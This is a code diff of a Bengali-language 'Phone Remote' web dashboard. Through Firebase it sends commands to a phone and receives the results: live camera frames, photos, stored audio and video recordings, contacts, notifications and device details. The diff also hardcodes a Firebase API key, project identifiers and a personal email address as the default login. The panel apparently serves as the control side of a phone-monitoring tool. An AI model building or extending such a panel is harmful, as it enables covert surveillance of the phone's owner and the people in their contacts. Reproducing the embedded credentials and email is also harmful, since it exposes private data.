@@ -25,7 +25,6 @@
   .ph{position:relative;aspect-ratio:1;border-radius:8px;overflow:hidden;border:1px solid var(--line);cursor:pointer;background:#0d1117;display:flex;align-items:center;justify-content:center}
   .ph img{width:100%;height:100%;object-fit:cover;display:block}
   .tag{position:absolute;left:4px;top:4px;background:rgba(0,0,0,.6);font-size:10px;padding:2px 5px;border-radius:4px}
-  .thumb-time{position:absolute;right:4px;bottom:4px;background:rgba(0,0,0,.6);font-size:10px;padding:2px 5px;border-radius:4px}
   .ph button{position:absolute;bottom:6px;padding:4px 10px;font-size:12px}
   .badge{padding:3px 10px;border-radius:99px;font-size:12px;border:1px solid var(--line)}
   .badge.on{color:var(--ok);border-color:var(--ok)}
@@ -43,7 +42,6 @@
   .rec{border:1px solid var(--line);border-radius:10px;padding:10px;margin-bottom:10px}
   .rec-head{font-size:13px;color:#cdd9e5;margin-bottom:8px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px}
   .rec video,.rec audio{width:100%;border-radius:6px}
-  .rec .dl{font-size:12px}
   #modal{position:fixed;inset:0;background:rgba(0,0,0,.87);display:flex;align-items:center;justify-content:center;z-index:50;cursor:zoom-out}
   #modal img{max-width:96vw;max-height:96vh;border-radius:8px}
   .hidden{display:none!important}
@@ -62,34 +60,28 @@
   <header>
     <h1>🛰️ Phone Remote ড্যাশবোর্ড</h1>
     <div class="row">
-      <button id="btnResetCfg" class="ghost hidden" title="Firebase কনফিগ বদলান">⚙️</button>
+      <button id="btnResetCfg" class="ghost" title="Firebase কনফিগ বদলান (ঐচ্ছিক)">⚙️</button>
       <button id="btnLogout" class="ghost hidden">লগআউট</button>
     </div>
   </header>
 
-  <!-- ধাপ ১: কনফিগ -->
+  <!-- কনফিগ: শুধু ⚙️ চেপে খোলে (ডিফল্ট কনফিগ ফাইলেই বসানো আছে) -->
   <section id="setupCard" class="card hidden">
-    <h2>১) Firebase কনফিগ</h2>
+    <h2>Firebase কনফিগ বদলান (ঐচ্ছিক)</h2>
     <p class="dim">
-      Firebase Console → ⚙️ <b>Project Settings</b> → <b>General</b> → আপনার Web অ্যাপ (<b>&lt;/&gt;</b> আইকন) →
-      SDK setup থেকে <b>পুরো firebaseConfig</b> কপি করে নিচে পেস্ট করুন।
-      (apiKey, databaseURL, projectId, appId — এগুলো লাগবেই)
+      আপনার প্রজেক্টের কনফিগ এখন ফাইলেই বসানো আছে — সাধারণত এখানে কিছু করতে হয় না।
+      অন্য কোনো Firebase প্রজেক্ট ব্যবহার করতে চাইলে সেটার Web অ্যাপের (<b>&lt;/&gt;</b> আইকন)
+      SDK setup থেকে পুরো <b>firebaseConfig</b> ব্লক কপি করে নিচে পেস্ট করুন।
     </p>
-    <textarea id="cfgRaw" placeholder='const firebaseConfig = {
-  apiKey: "AIza...",
-  databaseURL: "https://myproject-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "myproject",
-  messagingSenderId: "123456",
-  appId: "1:123...:web:abc..."
-};'></textarea>
+    <textarea id="cfgRaw" placeholder='const firebaseConfig = { ... };'></textarea>
     <div style="height:10px"></div>
     <button id="btnCfgSave">✅ কনফিগ সেভ করুন</button>
   </section>
 
-  <!-- ধাপ ২: লগইন -->
+  <!-- লগইন -->
   <section id="authCard" class="card hidden">
-    <h2>২) লগইন</h2>
-    <p class="dim">Firebase Security Rules-এ যে ইমেইলটি দিয়েছেন সেটাই ব্যবহার করুন। প্রথমবার "নতুন অ্যাকাউন্ট তৈরি করুন" চাপুন।</p>
+    <h2>লগইন</h2>
+    <p class="dim">প্রথমবার ব্যবহারের আগে Firebase Console → <b>Authentication → Sign-in method → Email/Password</b> চালু আছে কি না দেখে নিন। তারপর নিচে <b>"নতুন অ্যাকাউন্ট তৈরি করুন"</b> চাপুন (একবারই লাগবে)। Security Rules-এ যে ইমেইল দেওয়া আছে সেটাই ব্যবহার করতে হবে।</p>
     <input id="email" type="email" placeholder="ইমেইল" style="margin-bottom:8px">
     <input id="pass" type="password" placeholder="পাসওয়ার্ড (৬+ অক্ষর)" style="margin-bottom:10px">
     <div class="row">
@@ -143,7 +135,7 @@
       </div>
       <img id="liveImg" class="hidden" alt="লাইভ ফ্রেম">
       <div id="liveTime" class="dim" style="margin-top:6px"></div>
-      <p class="dim" style="margin:8px 0 0">প্রতি কয়েক সেকেন্ডে ফ্রেম বদলায় — কোথাও জমে না। ৩০ মিনিট পর নিজে থেমে যায়। ফ্রি প্ল্যানের মাসিক ডাউনলোড সীমা বাঁচাতে দীর্ঘ সময় দেখলে ৫–১০ সেকেন্ড ইন্টারভাল রাখুন।</p>
+      <p class="dim" style="margin:8px 0 0">প্রতি কয়েক সেকেন্ডে ফ্রেম বদলায় — কোথাও জমে না। ৩০ মিনিট পর নিজে থেমে যায়। ফ্রি প্ল্যানের মাসিক সীমা বাঁচাতে দীর্ঘ সময় দেখলে ৫–১০ সেকেন্ড ইন্টারভাল রাখুন।</p>
     </section>
 
     <section class="card">
@@ -234,6 +226,20 @@
 <script type="module">
 const $ = (id) => document.getElementById(id);
 
+// ---- প্রজেক্টে বেক করা কনফিগ (Firebase: monitor-dc4ab) ----
+// ড্যাশবোর্ড খুললেই এটাই ব্যবহার হয় — কিছু পেস্ট করতে হয় না।
+// ⚙️ বাটন দিয়ে চাইলে অন্য কনফিগে বদলানো যায়।
+const BUILT_IN_CFG = {
+  apiKey: 'AIzaSyBNan3cGjD1hBI6ycCTHaQrwSylHwDuxS0',
+  authDomain: 'monitor-dc4ab.firebaseapp.com',
+  databaseURL: 'https://monitor-dc4ab-default-rtdb.asia-southeast1.firebasedatabase.app',
+  projectId: 'monitor-dc4ab',
+  storageBucket: 'monitor-dc4ab.firebasestorage.app',
+  messagingSenderId: '172331973224',
+  appId: '1:172331973224:web:cea7d0576c3d3c5ad659dd'
+};
+const DEFAULT_EMAIL = 'foysal.cyber@gmail.com';
+
 let FB = null;                 // { app, auth, db, api }
 let user = null;
 let topUnsubs = [];
@@ -253,6 +259,7 @@ let notifKeys = new Set();
 let seenResults = new Set();
 let lastLiveAt = 0;
 let tick = null;
+let cfgEdit = false;           // ⚙️ চেপে কনফিগ বদলানোর মোড
 
 const escapeHtml = (s) => String(s).replace(/[&<>"']/g,
   (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
@@ -265,10 +272,24 @@ function toast(msg) {
   t._h = setTimeout(() => { t.style.display = 'none'; }, 2800);
 }
 
+// localStorage কখনো ব্লক থাকলে (যেমন চ্যাটের প্রিভিউ-স্যান্ডবক্সে) ক্র্যাশ না করে
+// নিরাপদে ফেইল করে
+function lsGet(k) { try { return localStorage.getItem(k); } catch (e) { return null; } }
+function lsSet(k, v) {
+  try { localStorage.setItem(k, v); return true; } catch (e) { return false; }
+}
+
 function parseCfg(raw) {
+  // স্মার্ট-কোট (" " ' '), মার্কডাউন লিংক [url](url) আর অদৃশ্য ইউনিকোড অক্ষর
+  // পরিষ্কার করি — মেসেঞ্জারের ভেতর দিয়ে কপি করলেও কাজ করে
+  const clean = String(raw)
+    .replace(/[\u201C\u201D]/g, '"')
+    .replace(/[\u2018\u2019]/g, "'")
+    .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '$2')
+    .replace(/[\uFEFF\u200B\u200C\u200D]/g, '');
   const g = (k) => {
-    const m = raw.match(new RegExp('"' + k + '"\\s*:\\s*"([^"]+)"'));
-    return m ? m[1] : '';
+    const m = clean.match(new RegExp("['\"]?" + k + "['\"]?\\s*[:=]\\s*['\"]([^'\"]+)"));
+    return m ? m[1].trim() : '';
   };
   return {
     apiKey: g('apiKey'),
@@ -281,17 +302,22 @@ function parseCfg(raw) {
 }
 
 function loadCfg() {
-  try { return JSON.parse(localStorage.getItem('pr_cfg') || 'null'); } catch (e) { return null; }
+  // আগে কেউ নিজে বদলে থাকলে সেটা, নাহলে বেক করা ডিফল্ট কনফিগ
+  try {
+    const s = JSON.parse(lsGet('pr_cfg') || 'null');
+    if (s && s.apiKey && s.databaseURL && s.appId && s.projectId) return s;
+  } catch (e) {}
+  return BUILT_IN_CFG;
 }
-function saveCfg(c) { localStorage.setItem('pr_cfg', JSON.stringify(c)); }
+function saveCfg(c) { return lsSet('pr_cfg', JSON.stringify(c)); }
 
 function showState() {
   const cfg = loadCfg();
-  $('setupCard').classList.toggle('hidden', !!cfg);
-  $('authCard').classList.toggle('hidden', !cfg || !!user);
+  $('setupCard').classList.toggle('hidden', !cfgEdit);
+  $('authCard').classList.toggle('hidden', cfgEdit || !!user);
   $('app').classList.toggle('hidden', !cfg || !user);
   $('btnLogout').classList.toggle('hidden', !user);
-  $('btnResetCfg').classList.toggle('hidden', !user);
+  $('btnResetCfg').textContent = cfgEdit ? '✖ বাতিল' : '⚙️';
 }
 
 // ---------------- বাটন সংযোগ ----------------
@@ -299,11 +325,21 @@ function showState() {
 function wire() {
   $('btnCfgSave').onclick = () => {
     const c = parseCfg($('cfgRaw').value);
-    if (!c.apiKey || !c.projectId || !c.databaseURL || !c.appId) {
-      toast('❌ apiKey / projectId / databaseURL / appId পাওয়া যায়নি — পুরো firebaseConfig পেস্ট করুন');
+    const missing = [];
+    if (!c.apiKey) missing.push('apiKey');
+    if (!c.projectId) missing.push('projectId');
+    if (!c.databaseURL) missing.push('databaseURL');
+    if (!c.appId) missing.push('appId');
+    if (missing.length) {
+      toast('❌ পাওয়া যায়নি: ' + missing.join(', ') + ' — Firebase Console-এর পুরো firebaseConfig ব্লকটা হুবহু পেস্ট করুন');
       return;
     }
-    saveCfg(c);
+    if (!saveCfg(c)) {
+      toast('❌ এই প্রিভিউতে সেভ করা যাচ্ছে না — dashboard.html ডাউনলোড করে Chrome/Firefox-এ খুলুন');
+      $('noNet').classList.remove('hidden');
+      return;
+    }
+    cfgEdit = false;
     toast('✅ সেভ হয়েছে — পেজ রিলোড হচ্ছে…');
     setTimeout(() => location.reload(), 700);
   };
@@ -315,7 +351,7 @@ function wire() {
     if (!email || pass.length < 6) { toast('ইমেইল ও ৬+ অক্ষরের পাসওয়ার্ড দিন'); return; }
     const fn = creator ? FB.api.createUserWithEmailAndPassword : FB.api.signInWithEmailAndPassword;
     fn(FB.auth, email, pass)
-      .then(() => { localStorage.setItem('pr_email', email); })
+      .then(() => { lsSet('pr_email', email); })
       .catch((e) => {
         const m = {
           'auth/email-already-in-use': 'এই ইমেইলে অ্যাকাউন্ট আছে — লগইন বাটন চাপুন',
@@ -333,10 +369,20 @@ function wire() {
 
   $('btnLogout').onclick = () => { if (FB) FB.api.signOut(FB.auth); };
   $('btnResetCfg').onclick = () => {
-    if (confirm('Firebase কনফিগ মুছে নতুন করে সেট করবেন?')) {
-      localStorage.removeItem('pr_cfg');
-      location.reload();
-    }
+    if (cfgEdit) { cfgEdit = false; showState(); return; }
+    const cfg = loadCfg();
+    $('cfgRaw').value = 'const firebaseConfig = {\n' +
+      '  apiKey: "' + cfg.apiKey + '",\n' +
+      '  authDomain: "' + (cfg.authDomain || '') + '",\n' +
+      '  databaseURL: "' + cfg.databaseURL + '",\n' +
+      '  projectId: "' + cfg.projectId + '",\n' +
+      '  storageBucket: "' + (cfg.storageBucket || '') + '",\n' +
+      '  messagingSenderId: "' + (cfg.messagingSenderId || '') + '",\n' +
+      '  appId: "' + cfg.appId + '"\n' +
+      '};';
+    cfgEdit = true;
+    showState();
+    $('setupCard').scrollIntoView({ behavior: 'smooth' });
   };
 
   document.querySelectorAll('.camBtn').forEach((b) =>
@@ -439,7 +485,7 @@ function clearDeviceUI() {
   photoKeys.clear(); recKeys.clear(); notifKeys.clear();
   Object.values(photoMem).forEach((u) => URL.revokeObjectURL(u));
   Object.values(recMem).forEach((u) => URL.revokeObjectURL(u));
-  status = {}; deviceInfo = {}; contacts = {};
+  status = {}; deviceInfo = {}; contacts = [];
   galleryTiles = {}; photoTiles = {}; recTiles = {}; photoMem = {}; recMem = {};
   lastLiveAt = 0;
   $('photoGrid').innerHTML = '';
@@ -477,7 +523,7 @@ function attachDevices() {
       o.value = n; o.textContent = n;
       sel.appendChild(o);
     });
-    const saved = localStorage.getItem('pr_device');
+    const saved = lsGet('pr_device');
     if (!attachedDevice || !names.includes(attachedDevice)) {
       attachedDevice = (saved && names.includes(saved)) ? saved : names[0];
       attachDeviceListeners();
@@ -485,7 +531,7 @@ function attachDevices() {
     sel.value = attachedDevice;
     sel.onchange = () => {
       attachedDevice = sel.value;
-      localStorage.setItem('pr_device', attachedDevice);
+      lsSet('pr_device', attachedDevice);
       attachDeviceListeners();
     };
   }));
@@ -617,6 +663,7 @@ function fillPhotoTile(d, key, meta) {
 }
 
 function photoArrived(photoId, url) {
+  if (!photoId) return;
   photoMem[photoId] = url;
   const meta = { at: Date.now() };
   if (photoTiles[photoId]) fillPhotoTile(photoTiles[photoId], photoId, meta);
@@ -660,7 +707,7 @@ function fillRecTile(d, key, meta) {
     d.appendChild(el);
   } else {
     const btn = document.createElement('button');
-    btn.textContent = meta.type === 'audio' ? '▶ চালান (ডাউনলোড)' : '▶ চালান (ডাউনলোড)';
+    btn.textContent = '▶ চালান (ডাউনলোড)';
     btn.onclick = () => {
       sendCmd('get_stored_rec', { id: key });
       toast('রেকর্ডিং আসছে… (সাইজ অনুযায়ী সময় লাগতে পারে)');
@@ -670,6 +717,7 @@ function fillRecTile(d, key, meta) {
 }
 
 function recArrived(recId, url, meta) {
+  if (!recId) return;
   recMem[recId] = url;
   if (recTiles[recId]) fillRecTile(recTiles[recId], recId, meta || {});
 }
@@ -732,7 +780,7 @@ function handleResult(v, key) {
       break;
 
     case 'get_stored_rec':
-      startTransfer(v.transfer, (url, meta) => {
+      startTransfer(v.transfer, (url) => {
         recArrived(v.recId, url, {});
         toast('✅ রেকর্ডিং এসে গেছে');
       }, '❌ রেকর্ডিং আসেনি');
@@ -845,7 +893,6 @@ showState();
   }
 
   const cfg = loadCfg();
-  if (!cfg) return;
 
   try {
     const init = {
@@ -864,7 +911,7 @@ showState();
       db: DB.getDatabase(app),
       api: Object.assign({}, A, AU, DB)
     };
-    $('email').value = localStorage.getItem('pr_email') || '';
+    $('email').value = lsGet('pr_email') || DEFAULT_EMAIL;
     FB.api.onAuthStateChanged(FB.auth, (u) => {
       user = u;
       if (u) attachDevices();
@@ -872,10 +919,10 @@ showState();
       showState();
     });
   } catch (e) {
-    toast('কনফিগ দিয়ে Firebase চালু করা যায়নি: ' + e.message);
+    toast('Firebase চালু করা যায়নি: ' + e.message);
     showState();
   }
 })();
 </script>
-<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3d74b7c59723f11',t:'MTc4OTgwNzMyMw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3d7971799e10cc9',t:'MTc4OTgxMDQyMA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
